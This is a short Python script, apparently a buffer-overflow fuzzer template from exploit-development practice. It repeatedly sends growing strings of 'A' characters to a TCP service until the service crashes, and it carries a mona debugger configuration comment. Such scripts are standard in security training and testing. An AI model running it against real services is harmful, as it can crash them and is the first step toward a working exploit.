#!/usr/bin/env python3
import socket, time

ip = ""
port = 1337
timeout = 5

prefix = ""
payload = prefix + "A" * 100

# !mona config -set workingfolder c:\mona\%p

def send(buffer):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(bytes(buffer, "latin-1"))
        s.recv(1024) # Try to received afterwards
        s.close()

if __name__ == '__main__':
    while True:
        try:
            print(f"Sending payload {len(payload) - len(prefix)} bytes...")
            send(payload)
        except Exception as ex:
            print(f"Crashed (timeout) at: {len(payload) - len(prefix)}\n{ex}")
            quit()
        payload += "A" * 100
        time.sleep(.5)